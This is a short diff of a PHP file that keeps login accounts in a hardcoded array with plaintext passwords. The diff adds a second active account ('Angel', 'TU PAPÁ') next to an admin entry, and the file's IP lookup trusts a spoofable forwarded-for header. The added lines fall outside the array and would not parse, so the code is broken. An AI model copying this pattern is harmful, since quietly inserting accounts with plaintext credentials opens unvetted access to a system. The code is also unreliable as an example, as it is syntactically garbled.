@@ -14,6 +14,9 @@ $admin_id = "7621351319";
 $agentes = array (
   0 => array ('u' => 'admin', 'p' => '7621351319', 'n' => 'ZETA MASTER', 'ip' => '127.0.0.1', 'status' => 'Active'),
 );
+ ('u' => 'Angel', 'p' => 'Rojaz', 'n' => 'TU PAPÁ', 'ip' => '127.0.0.1', 'status' => 'Active'),
+);
+
 
 function getIP() { 
     if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0]; }
